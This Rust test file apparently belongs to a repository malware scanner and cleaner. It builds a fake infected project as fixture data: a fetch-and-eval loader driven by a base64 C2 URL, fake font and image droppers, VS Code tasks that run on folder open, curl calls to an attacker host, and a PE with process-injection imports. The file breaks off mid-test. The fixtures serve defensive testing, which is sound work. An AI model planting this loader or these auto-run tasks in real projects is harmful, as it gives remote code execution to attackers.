//! `guard scan`, `scan-git`, `open`, `clean` and `restore`, checked against
//! goldens recorded from scanner.py and remediator.py (Python). Was
//! tests/test_rust_scan.py, which ran both builds side by side.

mod common;

use std::path::{Path, PathBuf};
use std::process::Command;

use common::fixtures::build_pe_with;
use common::fixtures::{section, CODE, EXEC, READ, WRITE};
use common::samples::eicar;
use common::*;
use serde_json::{json, Value};
use sha2::Digest;

const SUITE: &str = "scan";

// The incident's loader, split so no source line carries it whole (Guard scans
// its own repository).
const PAYLOAD: &str = concat!(
    "(async () => {\n",
    "  const src = atob(process.env.AUTH_API_KEY);\n",
    "  const proxyInfo = await (await fetch(src)).text();\n",
    "  eval(proxy",
    "Info);\n",
    "})();\n"
);
const B64_C2: &str = concat!("aHR0cHM6Ly9hdXRoLWNvbmZpcm0tdGVu", "LnZlcmNlbC5hcHAvYXBp");
const EVAL: &str = concat!("eval(proxy", "Info)");

fn sha(b: &[u8]) -> String {
    sha2::Sha256::digest(b)
        .iter()
        .map(|x| format!("{x:02x}"))
        .collect()
}

// ---------------------------------------------------------------- corpus
/// Fake fonts / images: disguised source, suspicious source, bad headers, real ones.
fn droppers(d: &Path) {
    let js = b"const x = require('child_process'); global['!']='9'; module.exports = () => 1;\n";
    write(&d.join("public/fonts/fa-solid-400.woff2"), js);
    write(
        &d.join("public/fonts/real.woff2"),
        [b"wOF2".as_slice(), &[0u8; 64]].concat(),
    );
    write(
        &d.join("public/fonts/real.ttf"),
        [b"true".as_slice(), &[0u8; 64]].concat(),
    );
    write(
        &d.join("public/fonts/font.eot"),
        b"function f() { import x }\n",
    );
    write(
        &d.join("public/fonts/font2.eot"),
        (0u8..=255).collect::<Vec<u8>>(),
    );
    write(
        &d.join("img/logo.PNG"),
        [b"GIF89a".as_slice(), &[0u8; 32]].concat(),
    );
    write(
        &d.join("img/fake.jpg"),
        "/* \u{e9} */ var _$_1e42 = eval(process.env.X);\n",
    );
    write(&d.join("img/short.gif"), b"GI");
    write(&d.join("img/empty.ico"), b"");
    // the 4 KB sniff window ends inside a multi-byte character: not text
    write(
        &d.join("img/cut.png"),
        [b"require(".as_slice(), &[b'a'; 4087], "\u{e9}".as_bytes()].concat(),
    );
}

fn vscode(d: &Path, settings: Option<&[u8]>, tasks: Option<&[u8]>) -> PathBuf {
    if let Some(s) = settings {
        write(&d.join(".vscode/settings.json"), s);
    }
    if let Some(t) = tasks {
        write(&d.join(".vscode/tasks.json"), t);
    }
    std::fs::create_dir_all(d).unwrap();
    d.to_path_buf()
}

const TASKS: &str = r#"{
  // JSONC: comments and trailing commas
  "version": "2.0.0",
  "tasks": [
    {"label": "dev", "command": "npm", "args": ["run", "dev"],},
    {"label": "boot", "type": "shell", "command": "node", "args": ["./public/fonts/fa-solid-400.woff2"],
     "runOptions": {"runOn": "folderOpen"}},
    {"label": "top-level", "command": ["sh", "-c"], "args": "curl", "runOn": "folderOpen"},
    {"label": "quiet", "command": "make", "runOptions": {"runOn": "folderOpen"}},
    {"label": "fetch", "command": "true", "args": ["wget http://x/a.woff"]},
    "not a task",
    {"label": "num", "command": 3.0, "args": [1, null, true]},
  ],
}
"#;

fn manifests(d: &Path) {
    write(
        &d.join("package.json"),
        json!({"dependencies": {"@art-ws/common": "^2.0.27", "left-pad": "1.0.0"},
               "devDependencies": {"@art-ws/common": "2.0.22", "--no-audit": "*"}})
        .to_string(),
    );
    write(
        &d.join("web/package-lock.json"),
        json!({"packages": {"": {}, "node_modules/@art-ws/db-context": {"version": "2.0.21"},
                            "node_modules/a/node_modules/--hiljson": {}},
               "dependencies": {"x": {"version": "1", "dependencies": {"@art-ws/common": {"version": "2.0.28"}}}}})
        .to_string(),
    );
    write(
        &d.join("py/requirements-dev.txt"),
        "# pinned\n-r base.txt\nnum2words==0.5.16 ; python_version>'3'\nnum2words\nrequests==2.0\n",
    );
    write(
        &d.join("py/requirements.txt"),
        "num2words == 0.5.15\r\n0requests==0.0.1\n",
    );
    write(
        &d.join("py/Pipfile.lock"),
        json!({"default": {"num2words": {"version": "==0.5.16"}}, "develop": null}).to_string(),
    );
    write(&d.join("bad/package.json"), "{not json");
}

fn corpus(root: &Path) -> PathBuf {
    let d = root.join("repo");
    droppers(&d);
    vscode(
        &d,
        Some(b"{\n  // auto tasks\n  \"task.allowAutomaticTasks\": true,\n  \"editor.tabSize\": 2,\n}\n"),
        Some(TASKS.as_bytes()),
    );
    manifests(&d);
    write(
        &d.join(".env"),
        format!("PORT=3000\nAUTH_API_KEY={B64_C2}\n"),
    );
    write(
        &d.join("src/server.ts"),
        format!("import express from 'express';\n\n{PAYLOAD}\nexport const app = express();\n"),
    );
    write(
        &d.join("src/crlf.js"),
        format!("const a = 1;\n{PAYLOAD}module.exports = a;\n").replace('\n', "\r\n"),
    );
    write(
        &d.join("src/ioc.md"),
        concat!(
            "see https://auth-confirm-",
            "ten.vercel.app/api and 45.139.",
            "104.115\n"
        ),
    );
    write(
        &d.join("src/obf.mjs"),
        "var _$_1e42=['x'];sfL[\"constructor\"]('return this')();\n",
    );
    write(
        &d.join("src/unicode-\u{e9}\u{e8}.js"),
        format!("// caf\u{e9} \u{fffd}\n{EVAL}\n"),
    );
    write(
        &d.join("src/binary.dat"),
        [
            (0u8..=255).cycle().take(1024).collect::<Vec<u8>>(),
            EVAL.as_bytes().to_vec(),
        ]
        .concat(),
    );
    write(&d.join("eicar.com"), eicar());
    write(
        &d.join("bin/svchost.exe"),
        build_pe_with(
            &[
                section(b".text", EXEC | READ | CODE, vec![0x90; 512]),
                section(b".data", READ | WRITE, vec![0; 512]),
            ],
            0x1000,
            b"VirtualAllocEx\0WriteProcessMemory\0CreateRemoteThread\0",
            0x10B,
            false,
        ),
    );
    write(
        &d.join(".github/workflows/deploy.yml"),
        "on: push\njobs: {}\n",
    );
    write(
        &d.join(".github/workflows/ci.yml"),
        format!("run: node ./public/fonts/x.js && {EVAL}\n"),
    );
    write(
        &d.join(".github/workflows/nested/release.YAML"),
        "on: tag\n",
    );
    write(&d.join(".github/workflows/notes.txt"), "not a workflow\n");
    // pruned directories, and a file merely named like one
    write(&d.join("node_modules/evil/index.js"), PAYLOAD);
    write(&d.join("deep/target/x.js"), PAYLOAD);
    write(&d.join("deep/dist"), format!("{EVAL}\n"));
    write(&d.join("deep/Vendor/x.js"), format!("{EVAL}\n"));
    #[cfg(unix)]
    {
        use std::os::unix::fs::symlink;
        symlink(d.join("src"), d.join("linked-src")).unwrap();
        symlink(d.join("src/server.ts"), d.join("server-link.ts")).unwrap();
        symlink(d.join("missing.woff"), d.join("broken.woff")).unwrap();
    }
    d
}

fn norm(tmp: &Tmp) -> Norm {
    Norm::new()
        .path(&tmp.path, "TMP")
        .path(&repo_root(), "REPO")
}

fn g(tmp: &Tmp, args: &[&str]) -> Guard {
    guard(args)
        .home(&tmp.join("home"))
        .env("PYTHONIOENCODING", "utf-8")
}

fn both_outputs(n: &Norm, out: &Out) -> String {
    n.apply(&out.shown_all())
}

// ------------------------------------------------------- scan / open
#[test]
fn testdata_repos() {
    for repo in ["fake-infected-repo", "clean-repo", "wf-repo"] {
        for json_flag in [false, true] {
            let tmp = Tmp::new("testdata");
            let target = s(&repo_root().join("testdata").join(repo));
            let mut all = String::new();
            for cmd in ["scan", "open"] {
                let mut args = vec![cmd, target.as_str()];
                if json_flag {
                    args.push("--json");
                }
                all.push_str(&format!(
                    "=== {cmd}\n{}",
                    both_outputs(&norm(&tmp), &g(&tmp, &args).run())
                ));
            }
            golden(
                SUITE,
                &format!(
                    "testdata_repos-{repo}{}",
                    if json_flag { "-json" } else { "" }
                ),
                &all,
            );
        }
    }
}

#[test]
fn scan_corpus() {
    for json_flag in [false, true] {
        let tmp = Tmp::new("corpus");
        let d = corpus(&tmp.path);
        let mut args = vec!["scan", d.to_str().unwrap()];
        if json_flag {
            args.push("--json");
        }
        let out = g(&tmp, &args).run();
        assert_eq!(out.code, 1);
        if json_flag {
            let t = &parse_json(&out.stdout)["tree"];
            for b in [
                "vscode",
                "magic",
                "fingerprint",
                "workflow_baseline",
                "malicious_deps",
                "av",
            ] {
                assert!(t[b].as_array().is_some_and(|a| !a.is_empty()), "{b}");
            }
        }
        golden(
            SUITE,
            &format!("scan_corpus{}", if json_flag { "-json" } else { "" }),
            &both_outputs(&norm(&tmp), &out),
        );
    }
}

#[test]
fn scan_relative_and_default_path() {
    let tmp = Tmp::new("relative");
    let d = corpus(&tmp.path);
    let mut all = String::new();
    for args in [
        vec!["scan"],
        vec!["scan", "."],
        vec!["scan", "./"],
        vec!["scan", "--json"],
        vec!["open"],
        vec!["scan", "src/../src"],
    ] {
        all.push_str(&format!(
            "=== {}\n{}",
            args.join(" "),
            both_outputs(&norm(&tmp), &g(&tmp, &args).cwd(&d).run())
        ));
    }
    golden(SUITE, "scan_relative_and_default_path", &all);
}

#[test]
fn scan_missing_and_file_targets() {
    let tmp = Tmp::new("targets");
    let d = corpus(&tmp.path);
    let mut all = String::new();
    for target in [
        tmp.join("nope"),
        d.join("src/server.ts"),
        d.join("eicar.com"),
    ] {
        for cmd in ["scan", "open"] {
            let out = g(&tmp, &[cmd, &s(&target), "--json"]).run();
            all.push_str(&format!(
                "=== {cmd} {}\n{}",
                target.file_name().unwrap().to_string_lossy(),
                both_outputs(&norm(&tmp), &out)
            ));
        }
    }
    golden(SUITE, "scan_missing_and_file_targets", &all);
}

/// A baseline in the format workflow_baseline.py records.
fn record_baseline(home: &Path, repo: &Path) {
    let repo = strip_verbatim(std::fs::canonicalize(repo).unwrap());
    let p = s(&repo);
    let name: String = repo
        .file_name()
        .unwrap()
        .to_string_lossy()
        .chars()
        .map(|c| {
            if c.is_ascii_alphanumeric() || "_.-".contains(c) {
                c
            } else {
                '_'
            }
        })
        .collect();
    let key = format!("{name}-{}", &sha(p.as_bytes())[..12]);
    let mut files: Vec<PathBuf> = Vec::new();
    fn walk(d: &Path, out: &mut Vec<PathBuf>) {
        for e in std::fs::read_dir(d).unwrap() {
            let p = e.unwrap().path();
            if p.is_dir() {
                walk(&p, out);
            } else {
                out.push(p);
            }
        }
    }
    walk(&repo.join(".github/workflows"), &mut files);
    files.sort();
    let mut wf = serde_json::Map::new();
    for f in files {
        let ext = f
            .extension()
            .map(|e| e.to_string_lossy().to_lowercase())
            .unwrap_or_default();
        if ext == "yml" || ext == "yaml" {
            let rel = f
                .strip_prefix(&repo)
                .unwrap()
                .to_string_lossy()
                .replace('\\', "/");
            wf.insert(rel, json!(sha(&std::fs::read(&f).unwrap())));
        }
    }
    let data = json!({"repo": p, "approved_at": "2026-01-01T00:00:00+00:00", "approved_by": "", "workflows": wf});
    write(
        &home.join("baselines").join(format!("{key}.json")),
        serde_json::to_string_pretty(&data).unwrap(),
    );
}

#[test]
fn workflow_baselines() {
    // no baseline, then a recorded one with changed, added and removed workflows
    let tmp = Tmp::new("baselines");
    let d = tmp.join("wf");
    write(&d.join(".github/workflows/build.yml"), "on: push\n");
    write(&d.join(".github/workflows/deploy.yml"), "on: push\n");
    write(&d.join(".github/workflows/gone.yml"), "on: push\n");
    let n = norm(&tmp);
    let mut all = format!(
        "=== no baseline\n{}",
        both_outputs(&n, &g(&tmp, &["scan", &s(&d)]).run())
    );
    record_baseline(&tmp.join("home"), &d);
    all.push_str(&format!(
        "=== baseline\n{}",
        both_outputs(&n, &g(&tmp, &["scan", &s(&d), "--json"]).run())
    ));
    write(
        &d.join(".github/workflows/deploy.yml"),
        format!("on: push\nrun: {EVAL}\n"),
    );
    write(&d.join(".github/workflows/build.yml"), "on: [push]\n");
    write(&d.join(".github/workflows/new.yaml"), "on: push\n");
    std::fs::remove_file(d.join(".github/workflows/gone.yml")).unwrap();
    for flags in [vec![], vec!["--json"]] {
        let mut args = vec!["scan", d.to_str().unwrap()];
        args.extend(flags);
        let out = g(&tmp, &args).run();
        assert_eq!(out.code, 1);
        all.push_str(&format!(
            "=== changed {}\n{}",
            args.len(),
            both_outputs(&n, &out)
        ));
    }
    golden(SUITE, "workflow_baselines", &all);
}

/// Python's scan crashes on a lockfile holding a JSON list; the binary skips
/// the file and reports the rest of the tree as Python reported it without it
/// (the golden was recorded without the file).
#[test]
fn manifest_that_is_not_an_object() {
    let tmp = Tmp::new("manifest-list");
    let d = tmp.join("deps");
    manifests(&d);
    if reference().is_none() {
        write(&d.join("bad/Pipfile.lock"), "[1, 2]");
    }
    golden(
        SUITE,
        "manifest_that_is_not_an_object",
        &both_outputs(&norm(&tmp), &g(&tmp, &["scan", &s(&d), "--json"]).run()),
    );
}

#[test]
fn dependency_blocklist_override() {
    let tmp = Tmp::new("blocklist");
    let d = tmp.join("deps");
    manifests(&d);
    let bl = write(
        &tmp.join("bl.json"),
        json!({"npm": {"left-pad": ["< 1.1"]}, "pip": {"requests": ["= 2.0"]}}).to_string(),
    );
    let broken = write(&tmp.join("broken.json"), "{");
    let mut all = String::new();
    for (name, p) in [
        ("override", bl),
        ("missing", tmp.join("missing.json")),
        ("broken", broken),
    ] {
        let out = g(&tmp, &["scan", &s(&d), "--json"])
            .env("GUARD_DEP_BLOCKLIST", &p)
            .run();
        all.push_str(&format!("=== {name}\n{}", both_outputs(&norm(&tmp), &out)));
    }
    golden(SUITE, "dependency_blocklist_override", &all);
}

#[test]
fn open_vscode_variants() {
    type Case<'a> = (Option<&'a [u8]>, Option<&'a [u8]>);
    let cases: Vec<Case> = vec![
        (Some(br#"{"task.allowAutomaticTasks": true}"#), None),
        (Some(br#"{"task.allowAutomaticTasks": "true"}"#), None),
        (Some(br#"{"task.allowAutomaticTasks": true, oops}"#), None),
        (Some(br#"["task.allowAutomaticTasks"]"#), None),
        (Some(b"\xef\xbb\xbf{\"task.allowAutomaticTasks\": true}"), None),
        (None, Some(TASKS.as_bytes())),
        (None, Some(br#"{"tasks": [{"command": "node x", "runOn": "folderOpen"}], oops"#)),
        (None, Some(br#"{"tasks": "abc"}"#)),
        (None, Some(br#"{"tasks": [{"command": "x", "runOptions": {"runOn": ""}, "runOn": "FolderOpen"}]}"#)),
        (None, Some(b"[1]")),
        (Some(b""), Some(b"")),
    ];
    for (i, (settings, tasks)) in cases.into_iter().enumerate() {
        let tmp = Tmp::new("vscode");
        let d = vscode(&tmp.join("r"), settings, tasks);
        let n = norm(&tmp);
        let mut all = String::new();
        for args in [
            vec!["open", d.to_str().unwrap()],
            vec!["open", d.to_str().unwrap(), "--json"],
            vec!["scan", d.to_str().unwrap(), "--json"],
        ] {
            all.push_str(&format!(
                "=== {} {}\n{}",
                args[0],
                args.len(),
                both_outputs(&n, &g(&tmp, &args).run())
            ));
        }
        golden(SUITE, &format!("open_vscode_variants-{i}"), &all);
    }
}

#[test]
fn custom_signatures() {
    let tmp = Tmp::new("custom-sigs");
    let mut sig: Value =
        parse_json(&std::fs::read_to_string(repo_root().join("signatures.json")).unwrap());
    sig["regexes"].as_array_mut().unwrap().push(
        json!({"id": "t.re", "severity": "critical", "category": "t",
        "flags": "IGNORECASE|MULTILINE", "pattern": r"^\s*BAD\s+marker\Z", "desc": "custom"}),
    );
    sig["literals"].as_array_mut().unwrap().push(
        json!({"id": "t.lit", "severity": "high", "value": "needle", "desc": "lit",
        "applies_to": ["./notes/x.txt", ".cfg"]}),
    );
    sig["combo_rules"].as_array_mut().unwrap().push(
        json!({"id": "t.combo", "severity": "high", "all_of": ["alpha", "beta"], "desc": "combo"}),
    );
    sig["vscode_guard"]["tasks_danger_commands"] = json!(["Deno"]);
    sig["magic_bytes"]["by_ext"] = json!({".DAT": ["CAFE"], ".dat": ["beef"]});
    sig["known_dropper_filenames"] = json!(["evil.dat"]);
    sig["skip_path_prefixes"] = json!(["skipme/"]);
    let sp = write(&tmp.join("sig.json"), sig.to_string());
    let d = tmp.join("r");
    write(&d.join("notes/x.txt"), "a needle here\n  bad MARKER");
    write(&d.join("a.cfg"), "needle alpha beta");
    write(&d.join("evil.dat"), b"\xbe\xefxx");
    write(&d.join("plain.dat"), "require('x')");
    write(&d.join("skipme/y.txt"), "alpha beta");
    write(&d.join("z/skipme"), "alpha beta");
    vscode(
        &d,
        None,
        Some(br#"{"tasks": [{"command": "deno run x", "runOn": "folderOpen"}]}"#),
    );
    let n = norm(&tmp);
    let sig_eq = format!("--sig={}", s(&sp));
    let mut all = String::new();
    for args in [
        vec![
            "scan",
            d.to_str().unwrap(),
            "--signatures",
            sp.to_str().unwrap(),
        ],
        vec!["open", d.to_str().unwrap(), &sig_eq, "--json"],
    ] {
        all.push_str(&format!(
            "=== {}\n{}",
            args[0],
            both_outputs(&n, &g(&tmp, &args).run())
        ));
    }
    golden(SUITE, "custom_signatures", &all);
}

/// Python printed a traceback; the binary prints one line. Both exit 1.
#[test]
fn bad_signatures() {
    if reference().is_some() {
        return;
    }
    let tmp = Tmp::new("bad-sigs");
    for path in [tmp.join("missing.json"), write(&tmp.join("bad.json"), "{")] {
        let out = g(&tmp, &["scan", ".", "--signatures", &s(&path)]).run();
        assert_eq!(out.code, 1);
        assert!(
            out.stdout.is_empty() && out.stderr.starts_with("guard: "),
            "{}",
            out.stderr
        );
    }
}

#[test]
fn usage() {
    // `scan --json x` scans x, as Python 3.12.7+ argparse does (the release
    // was built with 3.12)
    for (i, args) in [
        vec!["scan", "-h"],
        vec!["open", "--help"],
        vec!["scan-git", "--he"],
        vec!["scan", "a", "b"],
        vec!["scan", "--json", "x"],
        vec!["scan", "--nope", "x", "y"],
        vec!["scan", "--json=1"],
        vec!["scan", "--signatures"],
        vec!["scan", ".", "--sig"],
        vec!["scan", "--", "--json"],
        vec!["scan", "-x"],
        vec!["scan", "-1"],
        vec!["open", ".", "--j", "--s", "-h"],
        vec!["scan", "--signatures", "--json"],
    ]
    .into_iter()
    .enumerate()
    {
        let tmp = Tmp::new("usage");
        let out = g(&tmp, &args).cwd(&tmp.path).run();
        golden(
            SUITE,
            &format!("usage-{i}"),
            &format!("$ {}\n{}", args.join(" "), both_outputs(&norm(&tmp), &out)),
        );
    }
}

// ------------------------------------------------------------- scan-git
fn have_git() -> bool {
    Command::new("git").arg("--version").output().is_ok()
}

fn git(repo: &Path, args: &[&str]) {
    let st = Command::new("git")
        .arg("-C")
        .arg(repo)
        .args(args)
        .envs([
            ("GIT_AUTHOR_NAME", "A"),
            ("GIT_AUTHOR_EMAIL", "a@x"),
            ("GIT_COMMITTER_NAME", "A"),
            ("GIT_COMMITTER_EMAIL", "a@x"),
            ("GIT_AUTHOR_DATE", "2026-01-01T00:00:00Z"),
            ("GIT_COMMITTER_DATE", "2026-01-01T00:00:00Z"),
            ("GIT_CONFIG_NOSYSTEM", "1"),
        ])
        .env(
            "GIT_CONFIG_GLOBAL",
            if WINDOWS { "NUL" } else { "/dev/null" },
        )
        .output()
        .unwrap();
    assert!(
        st.status.success(),
        "git {args:?}: {}",
        String::from_utf8_lossy(&st.stderr)
    );
}

#[test]
fn scan_git() {
    if !have_git() {
        return;
    }
    let tmp = Tmp::new("scan-git");
    let r = tmp.join("g");
    std::fs::create_dir_all(&r).unwrap();
    git(&r, &["init", "-q", "-b", "main"]);
    git(&r, &["config", "core.autocrlf", "false"]);
    write(&r.join("a.js"), "console.log(1)\n");
    git(&r, &["add", "-A"]);
    git(&r, &["commit", "-qm", "one"]);
    write(&r.join("a.js"), format!("console.log(1)\n{PAYLOAD}"));
    write(
        &r.join(".github/workflows/x.yml"),
        concat!("on: push\nrun: curl auth-confirm-", "ten.vercel.app\r\n"),
    );
    git(&r, &["add", "-A"]);
    git(&r, &["commit", "-qm", "two"]);
    write(&r.join("a.js"), "console.log(1)\n");
    std::fs::remove_file(r.join(".github/workflows/x.yml")).unwrap();
    git(&r, &["add", "-A"]);
    git(&r, &["commit", "-qm", "clean again"]);
    git(&r, &["checkout", "-qb", "side"]);
    write(
        &r.join("b.txt"),
        concat!("45.139.", "104.115\u{2028}line\n"),
    );
    git(&r, &["add", "-A"]);
    git(&r, &["commit", "-qm", "side"]);
    let n = norm(&tmp);
    let mut all = String::new();
    for flags in [vec![], vec!["--json"]] {
        let mut args = vec!["scan-git", r.to_str().unwrap()];
        args.extend(flags);
        let out = g(&tmp, &args).run();
        assert_eq!(out.code, 1);
        all.push_str(&format!("=== {}\n{}", args.len(), both_outputs(&n, &out)));
    }
    golden(SUITE, "scan_git", &all);
}

#[test]
fn scan_git_errors() {
    if !have_git() {
        return;
    }
    let tmp = Tmp::new("scan-git-errors");
    let plain = tmp.join("plain");
    write(&plain.join("x.txt"), "hi\n");
    let n = norm(&tmp);
    let mut all = String::new();
    for flags in [vec![], vec!["--json"]] {
        let mut args = vec!["scan-git", plain.to_str().unwrap()];
        args.extend(flags);
        all.push_str(&format!(
            "=== {}\n{}",
            args.len(),
            both_outputs(&n, &g(&tmp, &args).run())
        ));
    }
    golden(SUITE, "scan_git_errors", &all);
}

#[cfg(unix)]
#[test]
fn scan_git_without_git() {
    let tmp = Tmp::new("no-git");
    let plain = tmp.join("plain");
    write(&plain.join("x.txt"), "hi\n");
    let empty = tmp.join("nobin");
    std::fs::create_dir_all(&empty).unwrap();
    let out = g(&tmp, &["scan-git", &s(&plain), "--json"])
        .env("PATH", &empty)
        .run();
    golden(
        SUITE,
        "scan_git_without_git",
        &both_outputs(&norm(&tmp), &out),
    );
}

// ------------------------------------------------------- clean / restore
/// Files under `root` (links followed, as Path.is_file()): posix path -> sha256.
fn tree(root: &Path) -> String {
    let mut out = Vec::new();
    fn walk(base: &Path, d: &Path, out: &mut Vec<(String, String)>) {
        let Ok(rd) = std::fs::read_dir(d) else { return };
        for e in rd.flatten() {
            let p = e.path();
            let ft = e.file_type().unwrap();
            if ft.is_dir() {
                walk(base, &p, out);
            } else if p.is_file() {
                let rel = p
                    .strip_prefix(base)
                    .unwrap()
                    .to_string_lossy()
                    .replace('\\', "/");
                out.push((rel, sha(&std::fs::read(&p).unwrap())));
            }
        }
    }
    walk(root, root, &mut out);
    out.sort();
    out.iter().map(|(p, h)| format!("{p}  {h}\n")).collect()
}

/// The remediator's safe_name of a path.
fn safe(p: &Path) -> String {
    let s: String = s(p)
        .chars()
        .map(|c| {
            if c.is_ascii_alphanumeric() || "._-".contains(c) {
                c
            } else {
                '_'
            }
        })
        .collect();
    s.trim_matches('_').to_string()
}

struct Clean {
    tmp: Tmp,
    work: PathBuf,
    home: PathBuf,
}

impl Clean {
    fn new(build: impl Fn(&Path)) -> Clean {
        let tmp = Tmp::new("clean");
        let work = tmp.join("w");
        build(&work);
        let home = tmp.join("home");
        Clean { tmp, work, home }
    }
    fn norm(&self) -> Norm {
        Norm::new()
            .lit(&safe(&self.work), "<SAFE-W>")
            .path(&self.work, "W")
            .path(&self.home, "HOME")
            .path(&self.tmp.path, "TMP")
            .re(r"\d{8}T\d{6}Z", "TS")
    }
    fn run(&self, args: &[&str], cwd: Option<&Path>) -> Out {
        let a: Vec<String> = args
            .iter()
            .map(|x| x.replace("{w}", &s(&self.work)))
            .collect();
        let mut c = guard(&a).home(&self.home).env("PYTHONIOENCODING", "utf-8");
        if let Some(d) = cwd {
            c = c.cwd(d);
        }
        c.run()
    }
    /// Output, the work tree, the quarantine index and the backups.
    fn state(&self, out: &Out) -> String {
        let n = self.norm();
        let q = self.home.join("quarantine");
        let ts_re =
            regex::Regex::new(r"^\d{4}-\d\d-\d\dT\d\d:\d\d:\d\d(\.\d{6})?\+00:00$").unwrap();
        let mut index = String::new();
        if let Ok(t) = std::fs::read_to_string(q.join("index.jsonl")) {
            for line in t.lines().filter(|l| !l.trim().is_empty()) {
                let mut r: Value = parse_json(line);
                if let Some(ts) = r.as_object_mut().and_then(|m| m.shift_remove("ts")) {
                    let ts = ts.as_str().unwrap_or_default().to_string();
                    assert!(ts_re.is_match(&ts), "{ts}");
                }
                index.push_str(&n.apply(&canon_json(&r)));
            }
        }
        let mut backups = Vec::new();
        if let Ok(rd) = std::fs::read_dir(&q) {
            for e in rd.flatten() {
                let name = e.file_name().to_string_lossy().into_owned();
                if name.ends_with(".bak") {
                    backups.push(format!(
                        "{}  {}\n",
                        n.apply(&name),
                        sha(&std::fs::read(e.path()).unwrap())
                    ));
                }
            }
        }
        backups.sort();
        format!(
            "{}--- tree\n{}--- index\n{}--- backups\n{}",
            n.apply(&out.shown_all()),
            tree(&self.work),
            index,
            backups.concat()
        )
    }
}

fn infected_repo(d: &Path) {
    let src = d.parent().unwrap().join(".src");
    let repo = corpus(&src);
    copy_links(&repo, d);
}

/// shutil.copytree(symlinks=True)
fn copy_links(src: &Path, dst: &Path) {
    std::fs::create_dir_all(dst).unwrap();
    for e in std::fs::read_dir(src).unwrap().flatten() {
        let ft = e.file_type().unwrap();
        let to = dst.join(e.file_name());
        if ft.is_symlink() {
            #[cfg(unix)]
            {
                let target = std::fs::read_link(e.path()).unwrap();
                // links point into the source tree; repoint them at the copy
                let target = match target.strip_prefix(src) {
                    Ok(rel) => dst.join(rel),
                    Err(_) => target,
                };
                std::os::unix::fs::symlink(target, &to).unwrap();
            }
        } else if ft.is_dir() {
            copy_links(&e.path(), &to);
        } else {
            std::fs::copy(e.path(), &to).unwrap();
        }
    }
}

#[test]
fn clean_repo() {
    let c = Clean::new(infected_repo);
    let first = c.run(&["clean", "{w}"], None);
    let start = first.stdout.find('{').expect("a JSON summary");
    let summary = parse_json(&first.stdout[start..]);
    for k in ["neutralized", "quarantined", "config_cleaned"] {
        assert!(summary[k].as_array().is_some_and(|a| !a.is_empty()), "{k}");
    }
    let mut all = format!("=== first\n{}", c.state(&first));
    // a second run finds nothing left to fix
    let second = c.run(&["clean", "{w}"], None);
    all.push_str(&format!("=== second\n{}", c.state(&second)));
    golden(SUITE, "clean_repo", &all);
}

#[test]
fn clean_relative_and_restore() {
    let c = Clean::new(infected_repo);
    let mut all = format!("=== clean\n{}", c.state(&c.run(&["clean"], Some(&c.work))));
    // on POSIX the payload is cut through server-link.ts, a link to src/server.ts
    for target in [
        "src/server.ts",
        "server-link.ts",
        "public/fonts/fa-solid-400.woff2",
        ".vscode/tasks.json",
        "nope",
    ] {
        let target = s(Path::new(target));
        let out = c.run(&["restore", &target], Some(&c.work));
        assert_eq!(out.code, 0, "{}", out.stderr);
        all.push_str(&format!("=== restore {target}\n{}", c.state(&out)));
    }
    let original = std::fs::read(c.tmp.join(".src/repo/src/server.ts")).unwrap();
    assert_eq!(
        std::fs::read(c.work.join("src/server.ts")).unwrap(),
        original
    );
    golden(SUITE, "clean_relative_and_restore", &all);
}

#[test]
fn restore_by_backup_name() {
    let c = Clean::new(infected_repo);
    c.run(&["clean", "{w}"], None);
    let name = std::fs::read_dir(c.home.join("quarantine"))
        .unwrap()
        .flatten()
        .map(|e| e.file_name().to_string_lossy().into_owned())
        .find(|n| n.contains("server-link.ts") && n.ends_with(".bak"))
        .unwrap();
    let out = c.run(&["restore", &name], None);
    golden(SUITE, "restore_by_backup_name", &c.state(&out));
}

#[test]
fn clean_single_files() {
    let c = Clean::new(|d| {
        write(
            &d.join("app.js"),
            format!("const a = 1;\n{PAYLOAD}export default a;\n"),
        );
        write(
            &d.join("crlf.ts"),
            format!("let b = 2;\n\n\n{PAYLOAD}\n\n\nexport {{ b }};\n").replace('\n', "\r\n"),
        );
        write(
            &d.join("unbalanced.js"),
            format!("function f() {{\n  {PAYLOAD}\n"),
        );
        write(&d.join("lib.py"), format!("{EVAL}\n"));
        write(
            &d.join(".vscode/settings.json"),
            "{\"a\": 1, \"task.allowAutomaticTasks\": true, \"z\": [1.0, 1e5, \"\u{e9}\"]}",
        );
        write(
            &d.join(".vscode/launch.json"),
            r#"{"configurations": [], "tasks": [{"runOptions": {"runOn": "folderOpen"}, "command": "node ./x"}]}"#,
        );
        write(
            &d.join(".vscode/tasks.json"),
            r#"{"tasks": [{"label": "safe"}]}"#,
        );
    });
    let mut all = String::new();
    for f in [
        "app.js",
        "crlf.ts",
        "unbalanced.js",
        "lib.py",
        ".vscode/settings.json",
        ".vscode/launch.json",
        ".vscode/tasks.json",
        "missing.js",
    ] {
        let out = c.run(&["clean", &format!("{{w}}/{f}")], None);
        all.push_str(&format!("=== clean {f}\n{}", c.state(&out)));
    }
    golden(SUITE, "clean_single_files", &all);
}

#[test]
fn restore_errors() {
    let c = Clean::new(|d| std::fs::create_dir_all(d).unwrap());
    let mut all = format!("=== x\n{}", c.state(&c.run(&["restore", "x"], None)));
    all.push_str(&format!(
        "=== none\n{}",
        c.state(&c.run(&["restore"], None))
    ));
    let q = c.home.join("quarantine");
    std::fs::create_dir_all(&q).unwrap();
    write(
        &q.join("index.jsonl"),
        json!({"action": "quarantine", "path": "/x/y", "backup": s(&q.join("gone.bak"))})
            .to_string()
            + "\n\n",
    );
    all.push_str(&format!(
        "=== /x/y\n{}",
        c.state(&c.run(&["restore", "/x/y"], None))
    ));
    all.push_str(&format!(
        "=== gone.bak\n{}",
        c.state(&c.run(&["restore", "gone.bak"], None))
    ));
    golden(SUITE, "restore_errors", &all);
}

#[cfg(unix)]
#[test]
fn unreadable_files() {
    use std::os::unix::fs::PermissionsExt;
    if unsafe { libc::geteuid() } == 0 {
        eprintln!("skipped: needs a non-root user to make a file unreadable");
        return;
    }
    let tmp = Tmp::new("unreadable");
    let d = tmp.join("r");
    let lock = |p: &Path, mode| {
        std::fs::set_permissions(p, std::fs::Permissions::from_mode(mode)).unwrap()
    };
    for name in ["font.woff2", "app.js", "package.json"] {
        lock(&write(&d.join(name), format!("{EVAL}\n")), 0o000);
    }
    vscode(&d, Some(br#"{"task.allowAutomaticTasks": true}"#), None);
    lock(&d.join(".vscode/settings.json"), 0o000);
    write(&d.join("locked/x.js"), format!("{EVAL}\n"));
    lock(&d.join("locked"), 0o000);
    let n = norm(&tmp);
    let mut all = String::new();
    for args in [
        vec!["scan", d.to_str().unwrap()],
        vec!["scan", d.to_str().unwrap(), "--json"],
